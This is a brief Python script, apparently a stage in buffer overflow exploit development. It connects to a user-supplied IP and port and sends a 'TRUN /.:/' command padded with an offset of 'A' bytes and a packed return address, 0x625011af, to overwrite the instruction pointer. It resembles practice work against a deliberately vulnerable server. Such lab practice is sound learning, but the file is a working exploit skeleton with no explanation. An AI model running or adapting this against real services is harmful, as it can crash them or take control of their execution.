import socket
import sys
import struct

ip = input("ENTER THE IP: ")
port = int(input("ENTER THE PORT: "))
offset = int(input("ENTER THE OFFSET: "))
# jump_addr = input("JUMP TO ADDRESS: ")


code = (b'A' * offset) + struct.pack("<I", 0x625011af)



try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  s.send(b'TRUN /.:/' + code)
  print("sent")
  s.close()
except:
  print("ERROR")